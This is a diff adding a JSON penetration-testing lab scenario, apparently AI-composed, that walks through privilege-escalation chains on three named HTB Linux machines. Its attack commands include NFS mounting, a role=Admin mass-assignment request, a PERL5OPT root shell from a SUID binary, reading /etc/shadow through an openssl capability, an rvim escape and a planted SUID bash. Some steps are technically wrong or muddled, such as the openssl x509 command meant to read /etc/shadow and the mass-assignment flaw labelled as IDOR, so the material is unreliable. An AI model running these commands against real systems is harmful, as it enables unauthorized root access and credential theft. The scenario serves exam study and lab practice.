@@ -1,0 +1,238 @@
+{
+  "id": "nfs-capability-abuse",
+  "title": "NFS and Capability Abuse",
+  "category": "linux-standalone",
+  "source": ["HTB Clicker", "HTB Lightweight", "HTB Jail"],
+  "designed_by": "ai-composite",
+  "description": "Three Linux standalone machines: Clicker — NFS export → mass assignment (role=Admin) → PHP RCE → SUID binary → PERL5OPT injection → root. Lightweight — LDAP sniffing → capabilities (openssl cap_dac_read_search) → read /etc/shadow → root. Jail — NFS export → custom binary → rvim escape → NFS no_root_squash → SUID bash → root.",
+  "introduction": "This scenario teaches Linux privilege escalation via NFS misconfigurations and capability abuse. These techniques appear frequently in OSCP labs.",
+  "mental_model": "NFS exports and capabilities are often overlooked. Always run showmount and getcap -r / after initial access.",
+  "key_principles": [
+    "showmount -e reveals writable shares for source/config",
+    "Mass assignment in registration can grant admin role",
+    "getcap -r / finds binaries with dangerous capabilities",
+    "cap_dac_read_search lets openssl read /etc/shadow",
+    "no_root_squash NFS lets you write SUID binaries as root"
+  ],
+
+  "indicators": {
+    "difficulty": 6,
+    "cognitive_load": 6,
+    "enumeration_depth": 5,
+    "rabbit_hole_risk": 4,
+    "time_pressure": 5
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006"],
+    "techniques": [
+      {"id": "T1046", "name": "Network Service Discovery"},
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"},
+      {"id": "T1574.006", "name": "Dynamic Linker Hijacking"},
+      {"id": "T1552.001", "name": "Credentials In Files"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T5-Credentials"],
+
+  "environment": {
+    "machine_count": 3,
+    "network_count": 1,
+    "os_distribution": {"windows": 0, "linux": 3},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "nfs", "showmount", "mount", "mass-assignment", "PERL5OPT",
+    "capabilities", "cap_dac_read_search", "openssl", "ldap",
+    "rvim", "no_root_squash", "SUID", "linpeas"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 22],
+    "pattern_frequency": "medium",
+    "recommended_order": 6
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.10.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "clicker",
+      "label": "CLICKER",
+      "ip": "10.10.11.232",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 2049,
+          "name": "NFS",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "misconfig", "summary": "NFS export accessible → mount and inspect", "leads_to": "web-source"}
+          ],
+          "commands": [
+            {"cmd": "showmount -e 10.10.11.232", "rationale": "Why: Find NFS exports for source code or config access"},
+            {"cmd": "sudo mount -t nfs 10.10.11.232:/exported /mnt/nfs", "rationale": "Why: Mount NFS to access source code or config"},
+            "ls -la /mnt/nfs"
+          ]
+        },
+        {
+          "port": 80,
+          "name": "HTTP (PHP App)",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "idor", "summary": "Mass assignment role=Admin in registration/API", "leads_to": "admin"},
+            {"type": "rce", "summary": "PHP RCE with admin role", "leads_to": "www-data"}
+          ],
+          "commands": [
+            {"cmd": "curl -X POST http://10.10.11.232/register -d 'user=test&pass=test&role=Admin'", "rationale": "Why: Mass assignment grants admin without auth"},
+            "# Or: Burp intercept, add role=Admin parameter"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "www-data",
+          "to": "root",
+          "technique": "SUID binary → PERL5OPT injection",
+          "commands": [
+            "find / -perm -4000 -type f 2>/dev/null",
+            "strings /path/to/suid-binary",
+            "# If binary runs perl: PERL5OPT='-e exec\"/bin/bash\"' ./suid-binary",
+            {"cmd": "PERL5OPT='-e exec\"/bin/bash -p\"' /path/to/suid-binary", "rationale": "Why: Inject code into perl SUID for root shell"}
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "lightweight",
+      "label": "LIGHTWEIGHT",
+      "ip": "10.10.10.119",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 389,
+          "name": "LDAP",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "sniffing", "summary": "LDAP traffic sniffing (unencrypted) → creds", "leads_to": "ldap-creds"}
+          ],
+          "commands": [
+            "tcpdump -i tun0 port 389 -w ldap.pcap",
+            "tshark -r ldap.pcap -Y ldap"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "user",
+          "to": "root",
+          "technique": "openssl cap_dac_read_search capability → read /etc/shadow",
+          "commands": [
+            {"cmd": "getcap -r / 2>/dev/null", "rationale": "Why: Capabilities may allow reading /etc/shadow"},
+            "# openssl has cap_dac_read_search: can read any file",
+            "openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem",
+            "openssl s_client -connect localhost:443 -cert cert.pem -key key.pem",
+            "# Or: use openssl to read /etc/shadow via capability",
+            {"cmd": "openssl x509 -in /etc/shadow -text", "rationale": "Why: cap_dac_read_search lets openssl read any file"}
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "ldap-user", "type": "password", "source": "LDAP sniffing", "unlocks": ["lightweight-ldap"]}
+      ],
+      "alternatives": []
+    },
+    {
+      "id": "jail",
+      "label": "JAIL",
+      "ip": "10.10.10.34",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 2049,
+          "name": "NFS",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "misconfig", "summary": "NFS export no_root_squash → mount custom binary", "leads_to": "privesc"}
+          ],
+          "commands": [
+            "showmount -e 10.10.10.34",
+            {"cmd": "sudo mount -t nfs 10.10.10.34:/exported /mnt/nfs", "rationale": "Why: no_root_squash share for SUID injection"},
+            "cat /mnt/nfs/*"
+          ]
+        },
+        {
+          "port": 22,
+          "name": "SSH",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SSH after initial access", "leads_to": "local-user"}
+          ],
+          "commands": ["ssh user@10.10.10.34"]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "user",
+          "to": "root",
+          "technique": "Custom binary → rvim escape → NFS no_root_squash → SUID bash",
+          "commands": [
+            "# Run restricted binary (rvim/jail)",
+            ":set shell=/bin/bash",
+            ":shell",
+            "# Or: find writable NFS share, place SUID bash",
+            {"cmd": "cp /bin/bash /mnt/nfs/bash", "rationale": "Why: no_root_squash lets us write as root"},
+            "chmod u+s /mnt/nfs/bash",
+            "# From target: /mnt/nfs/bash -p"
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {
+      "id": "path-clicker",
+      "name": "Clicker (NFS → mass assignment → PERL5OPT)",
+      "color": "#6bb8cc",
+      "steps": ["clicker"],
+      "description": "NFS export → mass assignment role=Admin → PHP RCE → SUID binary → PERL5OPT injection → root"
+    },
+    {
+      "id": "path-lightweight",
+      "name": "Lightweight (LDAP → capabilities)",
+      "color": "#e8a87c",
+      "steps": ["lightweight"],
+      "description": "LDAP sniffing → capabilities (openssl cap_dac_read_search) → read /etc/shadow → root"
+    },
+    {
+      "id": "path-jail",
+      "name": "Jail (NFS → rvim → no_root_squash)",
+      "color": "#85e89d",
+      "steps": ["jail"],
+      "description": "NFS export → custom binary → rvim escape → NFS no_root_squash → SUID bash → root"
+    }
+  ]
+}
